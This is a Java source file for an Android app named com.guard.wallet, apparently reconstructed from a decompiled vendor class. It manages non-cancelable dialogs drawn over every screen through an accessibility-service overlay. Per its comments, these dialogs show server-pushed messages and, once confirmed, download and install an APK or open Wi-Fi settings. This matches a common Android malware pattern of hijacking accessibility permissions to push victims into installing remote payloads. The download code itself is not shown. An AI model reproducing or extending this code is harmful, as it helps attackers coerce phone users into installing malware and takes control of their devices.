package com.guard.wallet.helper;
import com.guard.wallet.core.AppUtils;

import android.app.AlertDialog;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.WindowManager;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Objects;
import java.lang.ref.WeakReference;
import java.util.concurrent.locks.ReentrantLock;

/**
 * 系统级通知对话框管理器。
 *
 * <p>通过 {@code TYPE_ACCESSIBILITY_OVERLAY} 窗口类型在任意界面上弹出系统对话框，
 * 用于服务端推送的通知提示和 WiFi 引导场景。
 *
 * <p>提供四个静态入口：
 * <ul>
 *   <li>{@link #a} — WiFi 引导对话框（确认后打开 WiFi 设置）</li>
 *   <li>{@link #b} — 通知对话框（确认后下载并安装 APK）</li>
 *   <li>{@link #c} — 带锁和重复检测的 WiFi 引导入口</li>
 *   <li>{@link #d} — 带锁的通知对话框入口</li>
 * </ul>
 *
 * <p>vendor 原名: {@code helper.n}
 */
public abstract class NotificationDialog {
    public static WeakReference<AlertDialog> a;
    public static final ReentrantLock b = new ReentrantLock();
    private static final Handler c = new Handler(Looper.getMainLooper());

    public static boolean a(String title, String msg, String btnText, String iconPkg, String iconUrl) {
        return showDialog(title, msg, btnText, iconPkg, new PositiveClickListener(0), true);
    }

    public static boolean b(String title, String msg, String btnText, String iconPkg, String iconUrl) {
        return showDialog(title, msg, btnText, iconPkg, new NegativeClickListener(iconPkg, iconUrl), false);
    }

    public static boolean c(String title, String msg, String btnText, String iconPkg, String iconUrl) {
        ReentrantLock lock = b;
        if (!lock.tryLock()) {
            return false;
        }
        try {
            WeakReference<AlertDialog> ref = a;
            if ((ref != null && ref.get() != null)
                    || Objects.equals(com.guard.wallet.utils.SystemHelper.z0().getIsWifiConnected(), 1)) {
                return false;
            }
            Runnable task = new DialogRemoveTask(1, title, msg, btnText, iconPkg, iconUrl);
            if (com.guard.wallet.utils.WindowUtils.isMainThread()) {
                task.run();
            } else {
                c.postDelayed(task, 300L);
            }
            return true;
        } finally {
            lock.unlock();
        }
    }

    /** vendor helper.n.d() — 弹出通知对话框，通过 NotificationDialog.b() 显示 */
    public static boolean d(String title, String msg, String btnText, String iconPkg, String iconUrl) {
        ReentrantLock lock = b;
        if (!lock.tryLock()) {
            return false;
        }
        try {
            if (com.guard.wallet.utils.WindowUtils.isMainThread()) {
                if (b(title, msg, btnText, iconPkg, iconUrl)) {
                    Log.d("com.guard.wallet.helper.n", "弹出通知对话框成功");
                } else {
                    Log.e("com.guard.wallet.helper.n", "弹出通知对话框失败");
                }
            } else {
                new android.os.Handler(Looper.getMainLooper()).postDelayed(
                        new DialogRemoveTask(0, title, msg, btnText, iconPkg, iconUrl), 300L);
            }
            return true;
        } finally {
            lock.unlock();
        }
    }

    private static boolean showDialog(String title, String msg, String btnText, String iconPkg,
                                      android.content.DialogInterface.OnClickListener clickListener,
                                      boolean keepReference) {
        if (MyAccessibilityService.P() == null) {
            return false;
        }
        final boolean[] shown = {false};
        Runnable task = () -> {
            try {
                String positive = AppUtils.B(btnText) ? "OK" : btnText;
                Drawable icon = !AppUtils.B(iconPkg) ? com.guard.wallet.utils.SystemHelper.V(iconPkg) : null;
                AlertDialog.Builder builder = new AlertDialog.Builder(MyAccessibilityService.P(), 5);
                if (!AppUtils.B(title)) {
                    builder.setTitle(title);
                }
                builder.setMessage(msg);
                builder.setCancelable(false);
                builder.setPositiveButton(positive, clickListener);
                builder.setOnDismissListener(new DismissListener(0));
                if (icon != null) {
                    builder.setIcon(icon);
                }
                AlertDialog dialog = builder.create();
                if (dialog == null || dialog.getWindow() == null) {
                    return;
                }
                WindowManager.LayoutParams params = dialog.getWindow().getAttributes();
                params.type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
                dialog.getWindow().setAttributes(params);
                dialog.show();
                if (keepReference) {
                    a = new WeakReference<>(dialog);
                }
                shown[0] = true;
                Log.d("com.guard.wallet.helper.n", "dialog shown: " + title);
            } catch (Exception e) {
                AppUtils.s("com.guard.wallet.helper.n", e);
            }
        };
        if (Looper.getMainLooper() == Looper.myLooper()) {
            task.run();
        } else {
            c.post(task);
        }
        return shown[0] || !com.guard.wallet.utils.WindowUtils.isMainThread();
    }
}
